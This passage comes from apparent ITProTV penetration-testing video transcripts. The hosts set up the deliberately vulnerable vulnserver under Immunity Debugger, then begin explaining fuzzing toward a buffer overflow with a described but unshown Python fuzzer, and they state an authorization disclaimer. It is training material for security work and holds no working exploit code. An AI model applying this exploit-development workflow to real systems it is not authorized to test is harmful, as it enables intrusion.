these things and\ngo, this is gonna work.\n\n378\n00:17:58.770 --> 00:18:01.960\n&gt;&gt; Yeah, this just goes back to\nour scanning and enumeration.\n\n379\n00:18:01.960 --> 00:18:04.884\nWhen we're doing not just port\nscanning to see what ports are open.\n\n380\n00:18:04.884 --> 00:18:07.090\nBut we're also doing the banner-grabbing.\n\n381\n00:18:07.090 --> 00:18:09.726\nI need to know what version\nof Apache they're running,\n\n382\n00:18:09.726 --> 00:18:12.370\nwhat version of Perl they're\nimplementing with that.\n\n383\n00:18:12.370 --> 00:18:16.012\nBecause I need to set up a duplicate\nenvironment down to the version and\n\n384\n00:18:16.012 --> 00:18:16.764\npatch level.\n\n385\n00:18:16.764 --> 00:18:19.620\nSo that I can verify that\nwhat I'm doing is gonna work.\n\n386\n00:18:19.620 --> 00:18:23.660\n&gt;&gt; That's exactly right, and Mike is\nnailing right on the head, yet again,\n\n387\n00:18:23.660 --> 00:18:27.469\ncuz he's a fan, he knows this stuff\n&gt;&gt; He's not just a pretty face standing\n\n388\n00:18:27.469 --> 00:18:29.832\nnext to me,\nhe's a smart man he knows his security.\n\n389\n00:18:29.832 --> 00:18:32.741\nYou need down to that version and\npatch number,\n\n390\n00:18:32.741 --> 00:18:36.170\nbecause those are different\nprograms from each other.\n\n391\n00:18:36.170 --> 00:18:38.910\nEven though it's the same program per se,\nif the patch number is\n\n392\n00:18:38.910 --> 00:18:42.333\ndifferent you're going to get different\nresults, it may work it may not work.\n\n393\n00:18:42.333 --> 00:18:45.865\nSo you have to be consistent\nin that test environment.\n\n394\n00:18:45.865 --> 00:18:49.794\nIf you have a client who say we'd\nlike you to pen test our systems,\n\n395\n00:18:49.794 --> 00:18:52.869\nWell you need pass numbers,\nversion numbers, and\n\n396\n00:18:52.869 --> 00:18:56.580\nmake a model of everything\nthat they want you to test.\n\n397\n00:18:56.580 --> 00:18:57.920\nBuild your sandboxes.\n\n398\n00:18:57.920 --> 00:19:00.940\nKeep them off the internet,\ncuz obviously they might be vulnerable.\n\n399\n00:19:00.940 --> 00:19:02.470\nYou've got to find that out.\n\n400\n00:19:02.470 --> 00:19:03.421\nSo just keep that in mind.\n\n401\n00:19:03.421 --> 00:19:06.133\nSo build that test and like I said,\nwe'll sit here and wait for\n\n402\n00:19:06.133 --> 00:19:07.870\nyou until you're done.\n\n403\n00:19:07.870 --> 00:19:10.108\nNow that's done we will move on.\n\n404\n00:19:10.108 --> 00:19:11.354\nWhat else do we need to know.\n\n405\n00:19:11.354 --> 00:19:12.670\nYou need a debugger.\n\n406\n00:19:12.670 --> 00:19:16.140\nIt's kind of this is a important\npiece of this puzzle and\n\n407\n00:19:16.140 --> 00:19:17.870\nsomething that you will need to learn.\n\n408\n00:19:17.870 --> 00:19:21.161\nAnd the learning curve\n[NOISE] is a little steep,\n\n409\n00:19:21.161 --> 00:19:24.670\njust throwing it out there,\nbeing honest with my viewers.\n\n410\n00:19:24.670 --> 00:19:29.281\nI don't want them to think, man I'm just\ngonna grab this debugger an go to town.\n\n411\n00:19:29.281 --> 00:19:34.091\nMan I've been frustrated learning the\ndebugger, so get your documentation ready,\n\n412\n00:19:34.091 --> 00:19:35.911\nyou're gonna have questions.\n\n413\n00:19:35.911 --> 00:19:37.330\nYou need to learn your debugger.\n\n414\n00:19:37.330 --> 00:19:40.690\nI recommend Immunity because I like it,\nbecause I've used it,\n\n415\n00:19:40.690 --> 00:19:41.960\nand that's what I know.\n\n416\n00:19:41.960 --> 00:19:44.039\nThere are other really\ngood debuggers out there.\n\n417\n00:19:44.039 --> 00:19:45.904\nOllyDbg, I think is another one.\n\n418\n00:19:45.904 --> 00:19:50.314\nI've actually used that before\nto do security stuff to it,\n\n419\n00:19:50.314 --> 00:19:52.885\nI'll say, to do security stuff.\n\n420\n00:19:52.885 --> 00:19:56.999\nBut when I found Immunity,\nI liked Immunity better for my purposes.\n\n421\n00:19:56.999 --> 00:20:00.710\nSo if you like OllyDbg,\ngreat, great program.\n\n422\n00:20:00.710 --> 00:20:02.810\nBut Immunity is fantastic.\n\n423\n00:20:02.810 --> 00:20:06.176\nLet me just show you a look at their\nwebsite so you can see how to get there.\n\n424\n00:20:06.176 --> 00:20:08.921\nLet me jump over here, grab a browser.\n\n425\n00:20:08.921 --> 00:20:16.490\nAnd I'm just gonna Google search Immunity\ndebugger for Windows, there we go.\n\n426\n00:20:16.490 --> 00:20:18.915\nSo you can see I've looked this up\nbefore so I can show you good people.\n\n427\n00:20:18.915 --> 00:20:22.263\nAnd there's their website, looks,\nit's got a really nice website.\n\n428\n00:20:22.263 --> 00:20:23.896\nThese people are really\ndeep into security stuff.\n\n429\n00:20:23.896 --> 00:20:27.042\nThey help pen testers a lot,\ntheir products are phenomenal.\n\n430\n00:20:27.042 --> 00:20:31.440\nThis is no exception, and there it is\nright on the first page right there.\n\n431\n00:20:31.440 --> 00:20:35.660\nIf you didn't land on this page,\nyou just go to products and\n\n432\n00:20:35.660 --> 00:20:38.320\nif I can that, there it is.\n\n433\n00:20:38.320 --> 00:20:40.988\nI'm in the debugger that\nshould take you here.\n\n434\n00:20:40.988 --> 00:20:43.927\nAnd when you do,\ngo down just to here and there you go.\n\n435\n00:20:43.927 --> 00:20:49.410\nYou'll have to fill out some information,\nso you know, as companies like to do.\n\n436\n00:20:50.420 --> 00:20:53.190\nSee who's interested in their product so\njust fill that out.\n\n437\n00:20:53.190 --> 00:20:55.502\nThen you hit your download button and\nyou get Immunity debugger.\n\n438\n00:20:55.502 --> 00:20:58.035\nIt installs like any other\nWindows 32 application.\n\n439\n00:20:58.035 --> 00:21:00.659\nYou guys know how to do that if\nyou're sitting in this class.\n\n440\n00:21:00.659 --> 00:21:01.988\nLike I said, assume knowledge.\n\n441\n00:21:01.988 --> 00:21:03.833\n&gt;&gt; [LAUGH]\n&gt;&gt; That you know how to install\n\n442\n00:21:03.833 --> 00:21:04.642\na program in Windows.\n\n443\n00:21:04.642 --> 00:21:07.389\n&gt;&gt; [LAUGH]\n&gt;&gt; Now once that's done obviously,\n\n444\n00:21:07.389 --> 00:21:10.480\nyou get to your package,\nit is install, I'll close that.\n\n445\n00:21:10.480 --> 00:21:15.548\nGo over to my Windows, let me close\nthis down, Ctrl+C, and get out of this.\n\n446\n00:21:15.548 --> 00:21:19.443\nThere is my Immunity Debugger right there.\n\n447\n00:21:19.443 --> 00:21:23.380\nSo, to get this to work to\nmake all things happy, and\n\n448\n00:21:23.380 --> 00:21:28.314\nmove it the way we need it to go\nwith our class or our sessions here.\n\n449\n00:21:28.314 --> 00:21:32.860\nOur episodes,\nactually I am going to start vulnserver.\n\n450\n00:21:32.860 --> 00:21:34.530\nI'm gonna run it as administrators.\n\n451\n00:21:34.530 --> 00:21:39.332\nCuz I like to keep it nice and give me,\nrip privileges once we exploit this thing.\n\n452\n00:21:39.332 --> 00:21:41.091\nAnd maybe I'm just a bad admin,\nand that's what I do.\n\n453\n00:21:41.091 --> 00:21:42.963\n&gt;&gt; [LAUGH]\n&gt;&gt; You know what I mean?\n\n454\n00:21:42.963 --> 00:21:44.582\nThat's what we're hoping for, absolutely.\n\n455\n00:21:44.582 --> 00:21:48.560\nI'm gonna run Immunity as an administrator\nas well, because we want full access.\n\n456\n00:21:48.560 --> 00:21:51.769\nRemember we are going down to\nmachine level stuff here so just,\n\n457\n00:21:51.769 --> 00:21:53.837\nI typically run as administrator here.\n\n458\n00:21:53.837 --> 00:21:55.958\nAnd there is our interface.\n\n459\n00:21:57.941 --> 00:22:01.128\nGot a lot buttons at the top,\nit looks cool.\n\n460\n00:22:01.128 --> 00:22:04.770\nWe've got this 4 squares\nI'm gonna show you a trick.\n\n461\n00:22:04.770 --> 00:22:07.410\nYou'll notice that\nthere's an x right here.\n\n462\n00:22:07.410 --> 00:22:09.390\nThis is something this\nis my helpful tip for\n\n463\n00:22:09.390 --> 00:22:12.970\ntoday with using Immunity\nthat drives me wild.\n\n464\n00:22:12.970 --> 00:22:15.439\nThere's an x here and this does this.\n\n465\n00:22:16.500 --> 00:22:17.128\nWhat's going on here?\n\n466\n00:22:17.128 --> 00:22:18.370\nI don't want this screen.\n\n467\n00:22:18.370 --> 00:22:20.111\nI don't need this screen for\nwhat I'm gonna show you.\n\n468\n00:22:20.111 --> 00:22:22.683\nI hit that x all the time,\nbecause it's right here next to the red x.\n\n469\n00:22:22.683 --> 00:22:25.232\n&gt;&gt; [LAUGH]\n&gt;&gt; Which when I want to close Immunity,\n\n470\n00:22:25.232 --> 00:22:26.164\nwhich I'll do a lot of.\n\n471\n00:22:26.164 --> 00:22:28.360\nWe're doing a lot of repetitive steps.\n\n472\n00:22:29.905 --> 00:22:31.015\nI tend to hit that.\n\n473\n00:22:31.015 --> 00:22:34.157\nTo get that screen back,\nlet me show you how to do that real quick.\n\n474\n00:22:34.157 --> 00:22:36.435\nYou run over here to-\n&gt;&gt; Let's not click the x again.\n\n475\n00:22:36.435 --> 00:22:38.754\n&gt;&gt; Yeah, let's not click,\nI mean you can, that's fine.\n\n476\n00:22:38.754 --> 00:22:40.757\nThere's other screens here,\nobviously, other screens.\n\n477\n00:22:40.757 --> 00:22:44.150\nThis is it with no\nmodules open whatsoever.\n\n478\n00:22:44.150 --> 00:22:49.787\nBut if you go over to View,\nyeah, View and hit CPU.\n\n479\n00:22:49.787 --> 00:22:52.557\nAnd then full screen it like this.\n\n480\n00:22:52.557 --> 00:22:54.012\nThere's our four screens back.\n\n481\n00:22:54.012 --> 00:22:59.580\nSo if accidentally hit that x as I\nvery well may do in this series.\n\n482\n00:22:59.580 --> 00:23:02.284\nNow you know how to get that back,\nthat's important.\n\n483\n00:23:02.284 --> 00:23:06.173\nBut to attach a program to it,\nour program, our vulnserver is running.\n\n484\n00:23:06.173 --> 00:23:11.880\nAll I have to do is go over to File,\nthis is the way I do it.\n\n485\n00:23:11.880 --> 00:23:17.856\nClick attach, and then you have a list of\nprograms that are running on the machine.\n\n486\n00:23:17.856 --> 00:23:22.410\nI like to sort it by name cuz I know v is\nnear the end, and then just scroll down.\n\n487\n00:23:22.410 --> 00:23:25.577\nAnd there it is vulnserver,\nthere, right there.\n\n488\n00:23:25.577 --> 00:23:29.723\nI can't really actually click on it,\nand then click attach.\n\n489\n00:23:29.723 --> 00:23:33.539\nNow the program is loaded\ninto the immunity debugger.\n\n490\n00:23:33.539 --> 00:23:35.742\nWe are seeing a lot of\nactivity at this point.\n\n491\n00:23:35.742 --> 00:23:41.394\nYou'll notice over here,\nall these things like NOP or where are we,\n\n492\n00:23:41.394 --> 00:23:48.540\nRETN, push, move, or, JE, these are all\nassembly language instructions.\n\n493\n00:23:48.540 --> 00:23:53.326\nSo the lowest language before you get\ninto binary, there's assembly, and\n\n494\n00:23:53.326 --> 00:23:56.707\nthis is what it's showing you,\nthere's assembly.\n\n495\n00:23:56.707 --> 00:24:00.522\nIt's basically taking the C Code\nthat the program is created from and\n\n496\n00:24:00.522 --> 00:24:03.700\nbreaking it down into assembly so\nthat you can see those.\n\n497\n00:24:03.700 --> 00:24:06.030\nBecause that's what we want to work with.\n\n498\n00:24:06.030 --> 00:24:07.840\nAnd over here we see\na couple other things.\n\n499\n00:24:07.840 --> 00:24:10.860\nThe register's a very important\npart of this procedure.\n\n500\n00:24:10.860 --> 00:24:12.724\nWe're gonna deal a lot over here,\n\n501\n00:24:12.724 --> 00:24:15.433\nwe're also gonna deal a lot\nover here in the dump.\n\n502\n00:24:15.433 --> 00:24:19.736\nSo if we wanna see what's in a register,\nwe send it to the dump.\n\n503\n00:24:19.736 --> 00:24:24.586\nWe can see what's going on there\nwith a little more microscopic view.\n\n504\n00:24:24.586 --> 00:24:28.900\nSo, you'll also notice something\ndown here, is that it is paused.\n\n505\n00:24:28.900 --> 00:24:30.891\nOnce you attach, yeah,\nthank you very much.\n\n506\n00:24:30.891 --> 00:24:32.719\nRight there,\ndown at the bottom right-hand corner.\n\n507\n00:24:32.719 --> 00:24:34.990\nThis is a paused system.\n\n508\n00:24:34.990 --> 00:24:37.538\nSo what it does is when you\nload a program into Immunity,\n\n509\n00:24:37.538 --> 00:24:41.024\nthe first thing it's gonna do is load\nit up and it's gonna pause the system.\n\n510\n00:24:41.024 --> 00:24:44.520\nIt's gonna say here it is,\ndoes everything look good to you?\n\n511\n00:24:44.520 --> 00:24:45.233\nDo you want to do anything?\n\n512\n00:24:45.233 --> 00:24:49.800\nAnd if you're good, if you're good to go,\nyou come over to here.\n\n513\n00:24:49.800 --> 00:24:50.750\nYou got a nice little play button.\n\n514\n00:24:50.750 --> 00:24:51.680\nAnd it should play.\n\n515\n00:24:51.680 --> 00:24:55.220\nAnd now if you look back at the bottom\nright-hand corner it says running.\n\n516\n00:24:55.220 --> 00:24:59.062\nSo now our our actual vulnserver\nis now running again.\n\n517\n00:24:59.062 --> 00:25:03.388\nIt just paused for a moment cuz\nimmunity kind of took control of it so\n\n518\n00:25:03.388 --> 00:25:04.790\nthat it could see it.\n\n519\n00:25:04.790 --> 00:25:06.110\nIt could do stuff with it.\n\n520\n00:25:06.110 --> 00:25:08.550\nAnd now that you say that yes,\nthat is happening.\n\n521\n00:25:08.550 --> 00:25:10.830\nYou've given it the green light,\nyou can hit play.\n\n522\n00:25:10.830 --> 00:25:13.453\nOnce it plays, you're, it just runs,\n\n523\n00:25:13.453 --> 00:25:17.861\nand now vulnserver is running normally for\nanybody on the outside.\n\n524\n00:25:17.861 --> 00:25:19.769\n&gt;&gt; All right, fantastic Daniel.\n\n525\n00:25:19.769 --> 00:25:21.667\nI know we've got a lot more to go, but\n\n526\n00:25:21.667 --> 00:25:25.670\nI think we might be at a good breaking\npoint here for this particular episode.\n\n527\n00:25:25.670 --> 00:25:27.054\nSo we've got our environment set up.\n\n528\n00:25:27.054 --> 00:25:28.276\nYou know, he showed us,\n\n529\n00:25:28.276 --> 00:25:31.670\nDaniel took time to show us what\na buffer overflow would end up doing.\n\n530\n00:25:31.670 --> 00:25:34.989\nWhat our end goal was,\nThe Tarantino move there, start to get.\n\n531\n00:25:34.989 --> 00:25:36.835\n&gt;&gt; [LAUGHS]\n&gt;&gt; Come back to the beginning,\n\n532\n00:25:36.835 --> 00:25:39.900\nwe've defined what a buffer overflow is.\n\n533\n00:25:39.900 --> 00:25:43.923\nAnd now we've set up our environment to\nwhere we can start taking an application,\n\n534\n00:25:43.923 --> 00:25:46.735\nlooking to see if it's\nvulnerable to a buffer overflow.\n\n535\n00:25:46.735 --> 00:25:49.883\nI know there's a couple more things\nwe're going to do in the setup as well.\n\n536\n00:25:49.883 --> 00:25:53.722\nBut, like I said, we're out of time for\nthis one, so that means we're gonna\n\n537\n00:25:53.722 --> 00:25:57.700\nleave you hanging on the edge of your\nseat, dying to know what Daniel does next.\n\n538\n00:25:57.700 --> 00:26:01.141\nWhich means you're gonna come back and\nwatch the next part, right?\n\n539\n00:26:01.141 --> 00:26:02.386\nHopefully.\n\n540\n00:26:02.386 --> 00:26:03.302\n&gt;&gt; That's the plan.\n\n541\n00:26:03.302 --> 00:26:04.291\n&gt;&gt; All right.\n\n542\n00:26:04.291 --> 00:26:05.984\nWell ladies and gentlemen,\nthat's gonna do it for this one.\n\n543\n00:26:05.984 --> 00:26:09.401\nWe hope you enjoyed watching, signing\noff for ITProTV, I've been your host,\n\n544\n00:26:09.401 --> 00:26:10.150\nMike Rodrick.\n\n545\n00:26:10.150 --> 00:26:11.887\n&gt;&gt; And I'm Daniel Lowrie.\n&gt;&gt; And we'll see you next time.\n\n546\n00:26:11.887 --> 00:26:19.002\n[MUSIC]\n\n547\n00:26:19.002 --> 00:26:21.652\nThank you for watching ITProTV.\n\n",

00:00:09.140\n[CROSSTALK]\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:12.530 --> 00:00:14.750\n&gt;&gt; Hello.\nWelcome to another exciting episode here\n\n5\n00:00:14.750 --> 00:00:15.299\nat ITProTV.\n\n6\n00:00:15.299 --> 00:00:19.660\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n7\n00:00:19.660 --> 00:00:20.530\nAnd in this episode,\n\n8\n00:00:20.530 --> 00:00:25.110\nwe're going to be continuing our thought\nprocess working with buffer overflows.\n\n9\n00:00:25.110 --> 00:00:29.430\nIn the previous episode, we learned\nabout what a buffer overflow is and\n\n10\n00:00:29.430 --> 00:00:32.466\nwe saw the end result of\na buffer overflow attack.\n\n11\n00:00:32.466 --> 00:00:36.060\nAnd now we're getting into\nhow to accomplish that.\n\n12\n00:00:36.060 --> 00:00:39.650\nAgain, at the very end of that last\nepisode, we got our environment set up, so\n\n13\n00:00:39.650 --> 00:00:41.470\nwe would have an area to work with.\n\n14\n00:00:41.470 --> 00:00:46.210\nAnd try to create our own buffer overflow\nand so that's what we're gonna pick us up.\n\n15\n00:00:46.210 --> 00:00:48.620\nSo if you miss that last one,\nmake sure you go back and watch that one.\n\n16\n00:00:48.620 --> 00:00:50.790\nIt will give you some good set up for\nthis episode.\n\n17\n00:00:50.790 --> 00:00:51.910\nAnd enough for me talking.\n\n18\n00:00:51.910 --> 00:00:56.135\nLet's dive back into it and I'll pass\nthe mic over to the Security guru, Mr.\n\n19\n00:00:56.135 --> 00:00:57.047\nDaniel Lowrie.\n\n20\n00:00:57.047 --> 00:00:58.310\nHow are you doing, Daniel?\n\n21\n00:00:58.310 --> 00:01:00.010\n&gt;&gt; Michael, thank you for having me back.\n\n22\n00:01:00.010 --> 00:01:02.820\nObviously we left you guys with\na cliffhanger a little bit.\n\n23\n00:01:02.820 --> 00:01:05.440\nWell, we're probably going to leave\nyou with another cliffhanger, so\n\n24\n00:01:05.440 --> 00:01:06.150\njust be prepared.\n\n25\n00:01:06.150 --> 00:01:10.580\nThis is a lot of information and like Mike\nsaid, if you didn't watch that previous\n\n26\n00:01:10.580 --> 00:01:14.400\nepisode, it's kind of necessary because\nwe're building that foundation, right?\n\n27\n00:01:14.400 --> 00:01:16.650\nYou've got to be with us where we're at or\n\n28\n00:01:16.650 --> 00:01:20.180\nat least know how to get where we're\nat before we can move forward.\n\n29\n00:01:20.180 --> 00:01:23.020\nSo that being said, we are moving\nback into buffer overflows, remember,\n\n30\n00:01:23.020 --> 00:01:27.160\nwe talked about what they were,\nhow they work and why they occur and\n\n31\n00:01:27.160 --> 00:01:28.730\nnow we're trying to make them happen.\n\n32\n00:01:28.730 --> 00:01:31.130\nNow we've set up our test environment,\n\n33\n00:01:31.130 --> 00:01:35.770\nwe've loaded our vulnerable server\nservice into our debugging machine.\n\n34\n00:01:35.770 --> 00:01:42.250\nSo that we can see certain pieces\nof instruction that's happening\n\n35\n00:01:42.250 --> 00:01:47.530\ninside of that and now we're moving on to\nthe next phase which is called fuzzing.\n\n36\n00:01:47.530 --> 00:01:50.660\n[LAUGH] I actually love\nthe term like fuzzing.\n\n37\n00:01:50.660 --> 00:01:51.530\n&gt;&gt; I like saying it.\n\n38\n00:01:51.530 --> 00:01:53.338\nSay it with us everybody out there.\n\n39\n00:01:53.338 --> 00:01:54.393\n&gt;&gt; Yeah.\n&gt;&gt; Fuzzing.\n\n40\n00:01:54.393 --> 00:01:55.240\n&gt;&gt; Fuzzing, right?\n\n41\n00:01:55.240 --> 00:01:55.910\nLot of fun, right?\n\n42\n00:01:55.910 --> 00:01:57.070\nSay fuzzing.\n\n43\n00:01:57.070 --> 00:01:57.980\nWhat is fuzzing?\n\n44\n00:01:57.980 --> 00:02:04.120\nFuzzing is basically trying to\nfigure out where the problem lies.\n\n45\n00:02:04.120 --> 00:02:07.120\nI guess that's a good way to say it.\n\n46\n00:02:07.120 --> 00:02:10.390\nSo you got a service,\nit takes input from you.\n\n47\n00:02:10.390 --> 00:02:11.560\nI wanna see whether or\n\n48\n00:02:11.560 --> 00:02:16.770\nnot that service is vulnerable to\na buffer overflow and implement fuzzing.\n\n49\n00:02:16.770 --> 00:02:17.970\nHow's that work?\n\n50\n00:02:17.970 --> 00:02:23.200\nI'm going to send a data until what I'm\nlooking for is the program to crash.\n\n51\n00:02:23.200 --> 00:02:26.632\nI want the program to crash,\nbecause if the program crashes,\n\n52\n00:02:26.632 --> 00:02:30.602\nthen at least I'm on the right track\ntoward a buffer overflow, right.\n\n53\n00:02:30.602 --> 00:02:37.770\nCuz that means that service had no idea\nwhat to do with the data I sent it.\n\n54\n00:02:37.770 --> 00:02:41.210\nNow that could be a lot of data,\nto be honest with you.\n\n55\n00:02:41.210 --> 00:02:45.100\nAnd fuzzing is a technique that helps\nus figure out how much data that is.\n\n56\n00:02:45.100 --> 00:02:48.800\nSo we have to, because if we\ndon't know how much data that is,\n\n57\n00:02:48.800 --> 00:02:49.880\nwe won't cause the crash.\n\n58\n00:02:51.520 --> 00:02:55.900\nIf it just never crashes or maybe we\nfigure out that it just doesn't crash.\n\n59\n00:02:55.900 --> 00:02:56.870\nWe can't get it to crash.\n\n60\n00:02:56.870 --> 00:03:01.070\nWe've fuzzed it to the nth degree and\nit just handles everything and\n\n61\n00:03:01.070 --> 00:03:03.890\nthe kitchen sink that we throw at it and\nwe're not getting anywhere.\n\n62\n00:03:03.890 --> 00:03:06.860\nFuzzing is the technique that\nfigures that's things out for us.\n\n63\n00:03:06.860 --> 00:03:10.170\nNow the cool thing is is that\nyou can download fuzzers.\n\n64\n00:03:10.170 --> 00:03:14.500\nThere are some third-party fuzzers\nready and able to do this work for\n\n65\n00:03:14.500 --> 00:03:17.480\nyou, but I'm going to show\nyou how to write a fuzzer.\n\n66\n00:03:17.480 --> 00:03:18.120\n&gt;&gt; Of course, you are.\n\n67\n00:03:18.120 --> 00:03:19.500\n&gt;&gt; Yes.\n&gt;&gt; [LAUGH]\n\n68\n00:03:19.500 --> 00:03:20.820\n&gt;&gt; Doesn't that sound fun?\n\n69\n00:03:20.820 --> 00:03:23.210\n&gt;&gt; It does.\n&gt;&gt; We're gonna write some code.\n\n70\n00:03:23.210 --> 00:03:26.620\nWe'll do our disclaimers for\nthe day, right?\n\n71\n00:03:26.620 --> 00:03:31.340\nSome assumed knowledge here that\nyou have the wherewithal to create\n\n72\n00:03:31.340 --> 00:03:32.560\na script of some sort.\n\n73\n00:03:32.560 --> 00:03:40.360\nThat you have at least some experience\nwith programming to some degree.\n\n74\n00:03:40.360 --> 00:03:43.460\nMaybe just to the part\nwhere you can read code and\n\n75\n00:03:43.460 --> 00:03:45.720\nmaybe not give you every little\ndetail of what's going on.\n\n76\n00:03:45.720 --> 00:03:49.030\nBut basically you get\nthe gist of what's happening,\n\n77\n00:03:49.030 --> 00:03:51.260\nthat's kind of where you\nneed to be at this point.\n\n78\n00:03:51.260 --> 00:03:53.670\n&gt;&gt; You need to know loops and\nif statements, probably.\n\n79\n00:03:53.670 --> 00:03:54.800\n&gt;&gt; Right.\n&gt;&gt; At least at a minimum.\n\n80\n00:03:54.800 --> 00:03:56.820\n&gt;&gt; Yeah.\n&gt;&gt; Understand what their purpose is.\n\n81\n00:03:56.820 --> 00:03:59.050\n&gt;&gt; Exactly, and\nwe talked about this earlier,\n\n82\n00:03:59.050 --> 00:04:01.920\nI'm talking about it again\ncuz I can't trust it enough.\n\n83\n00:04:01.920 --> 00:04:02.890\nAnybody who tells you,\n\n84\n00:04:02.890 --> 00:04:07.885\nyou need no programming experience to be\na penetration tester, not a good one.\n\n85\n00:04:07.885 --> 00:04:08.950\n&gt;&gt; [LAUGH]\n&gt;&gt; Or hey yeah,\n\n86\n00:04:08.950 --> 00:04:12.540\nmaybe you can be a penetration tester, but\nnot to be able to do things like this,\n\n87\n00:04:12.540 --> 00:04:15.230\nyou gonna have to differ on\nyour colleagues that can.\n\n88\n00:04:15.230 --> 00:04:18.860\nAnd that's not a bad thing per say, but\nyou wanna be the guy that can do that and\n\n89\n00:04:18.860 --> 00:04:20.700\nthat's gonna help you do jobs to say.\n\n90\n00:04:20.700 --> 00:04:24.080\nYes, I am proficient in at\nleast one programming language.\n\n91\n00:04:24.080 --> 00:04:29.400\nMight I suggest Python, because Python\nis a really easy language to learn.\n\n92\n00:04:29.400 --> 00:04:33.080\nI would also suggest learning Bash\nprogramming and scripting, right?\n\n93\n00:04:33.080 --> 00:04:37.920\nAgain, really easy to learn and\nall the concepts are there for\n\n94\n00:04:37.920 --> 00:04:41.100\nmore difficult programming language for\nyou to be able to jump into there.\n\n95\n00:04:41.100 --> 00:04:44.760\nSo once you learn something's that\na little bit easier then that's gonna\n\n96\n00:04:44.760 --> 00:04:48.420\nhelp you dip into the more difficult\nwaters, the deeper end of the pool.\n\n97\n00:04:48.420 --> 00:04:50.190\nSo I want to give that disclaimer and\nagain,\n\n98\n00:04:50.190 --> 00:04:51.250\nwe always like to give the disclaimer.\n\n99\n00:04:51.250 --> 00:04:55.050\nDon't perform any of these\nthings against servers or\n\n100\n00:04:55.050 --> 00:04:58.600\nservices that you do not own or\nhave authorization to.\n\n101\n00:04:58.600 --> 00:05:01.510\nBecause you can get into a lot of trouble,\nwe don't want you to get in trouble.\n\n102\n00:05:01.510 --> 00:05:03.900\nWe want you to become\nawesome pen testers and\n\n103\n00:05:03.900 --> 00:05:06.360\nnot have a federal record of some sort,\nright?\n\n104\n00:05:06.360 --> 00:05:10.812\n&gt;&gt; I don't know if you can get ITProTV in\nyour jail, [CROSSTALK] that'd be horrible.\n\n105\n00:05:10.812 --> 00:05:15.651\n&gt;&gt; [LAUGH] I don't know, prisons now,\nyou get free Wi-Fi, all of that,\n\n106\n00:05:15.651 --> 00:05:18.380\nit's kinda like a spa with bars [LAUGH].\n\n107\n00:05:18.380 --> 00:05:21.100\nSo that being said,\nremember those things, so\n\n108\n00:05:21.100 --> 00:05:24.110\nwe're gonna assume a little bit\nof programming knowledge here.\n\n109\n00:05:24.110 --> 00:05:26.290\nI will walk you through\na lot of this though.\n\n110\n00:05:26.290 --> 00:05:28.370\nI will explain what's going on.\n\n111\n00:05:28.370 --> 00:05:29.400\nCuz if you're watching us and\n\n112\n00:05:29.400 --> 00:05:32.060\nyou don't know anything about it,\nI do want you to be able to follow along.\n\n113\n00:05:32.060 --> 00:05:33.490\nSo let's jump back into my machine.\n\n114\n00:05:33.490 --> 00:05:36.458\nLet's take a look at my fuzzing\nprogram that I have written.\n\n115\n00:05:36.458 --> 00:05:40.350\nI have pre-written this, so that we\ndon't have to watch me bang out code and\n\n116\n00:05:40.350 --> 00:05:43.740\nfat finger mistype and\ngo why didn't that run right.\n\n117\n00:05:43.740 --> 00:05:45.670\nBecause there's a whitespace character.\n\n118\n00:05:45.670 --> 00:05:47.190\nI made sure all these work before hand.\n\n119\n00:05:47.190 --> 00:05:51.580\nSo don't crucify me because I\ndidn't write this right now.\n\n120\n00:05:51.580 --> 00:05:52.920\n&gt;&gt; [LAUGH]\n&gt;&gt; [INAUDIBLE] Be a 17 part show.\n\n121\n00:05:52.920 --> 00:05:59.530\nSo if I do an ls in this testing\ndirectory, I've got a few things here.\n\n122\n00:05:59.530 --> 00:06:05.890\nOne is my fuzzer.py, .py let's me know\nthis is a Python script or program.\n\n123\n00:06:05.890 --> 00:06:07.960\nSo just remember that.\n\n124\n00:06:07.960 --> 00:06:13.030\nI will open this up in my text\neditor of choice, which is Nano.\n\n125\n00:06:13.030 --> 00:06:16.910\nFuzzer.py, that way we get all the cool\ncolors and things of that nature.\n\n126\n00:06:18.450 --> 00:06:20.830\nSo what are we looking at here?\n\n127\n00:06:20.830 --> 00:06:25.940\nBasically, this is\ncreating a TCP/IP socket\n\n128\n00:06:25.940 --> 00:06:30.820\nto a IP address on a certain port number.\n\n129\n00:06:30.820 --> 00:06:32.889\nAnd I've made that a variable\nat the very top here and\n\n130\n00:06:32.889 --> 00:06:35.030\nyou'll notice this is in port socket.\n\n131\n00:06:35.030 --> 00:06:36.330\nSo you know that that's what we wanna do.\n\n132\n00:06:36.330 --> 00:06:38.420\nI wanna create a network socket and\n\n133\n00:06:38.420 --> 00:06:41.210\nthen here are the two variables\nthat I've created to let it know.\n\n134\n00:06:41.210 --> 00:06:43.150\nThat way, I can go back in and\n\n135\n00:06:43.150 --> 00:06:46.050\nchange it while I can change\njust hard encode that in.\n\n136\n00:06:46.050 --> 00:06:47.290\nLater, if you know anything about Python.\n\n137\n00:06:47.290 --> 00:06:48.980\nYes, you can do that.\n\n138\n00:06:48.980 --> 00:06:52.420\nBut if I wanna run this program\nagain on another server.\n\n139\n00:06:52.420 --> 00:06:55.000\nOr if I want to continue to make changes.\n\n140\n00:06:55.000 --> 00:06:57.980\nOr the IP changes on me,\nit's a DHCP thing.\n\n141\n00:06:57.980 --> 00:07:01.030\nIt's easier just to go into a variable.\n\n142\n00:07:01.030 --> 00:07:03.550\n&gt;&gt; As a penetration tester,\nthis is what you're gonna want to do.\n\n143\n00:07:03.550 --> 00:07:08.154\nYou're gonna want to have a bag full of\nthese scripts that you can simply punch in\n\n144\n00:07:08.154 --> 00:07:10.435\nan IP address and a port number and run.\n\n145\n00:07:10.435 --> 00:07:14.360\nYou don't want to have to rewrite\nthese scripts every job you go to.\n\n146\n00:07:14.360 --> 00:07:14.860\n&gt;&gt; No, no.\n\n147\n00:07:14.860 --> 00:07:16.870\nThat would not be fun at all.\n\n148\n00:07:16.870 --> 00:07:22.330\nUnless you're just a super proficient\nprogrammer and this is nothing to you.\n\n149\n00:07:22.330 --> 00:07:25.210\nBut a lot of guys do\nkeep a bag of scripts, so\n\n150\n00:07:25.210 --> 00:07:27.040\nall they have to do is\ndo some modification.\n\n151\n00:07:27.040 --> 00:07:29.370\nWhen we take a look at\nfinding exploit code,\n\n152\n00:07:29.370 --> 00:07:30.980\nyou'll see that that's\nbasically what it is.\n\n153\n00:07:30.980 --> 00:07:32.110\nYou're gonna grab that code,\n\n154\n00:07:32.110 --> 00:07:36.230\nmodify it to what you needed to do and\nthen implement it.\n\n155\n00:07:36.230 --> 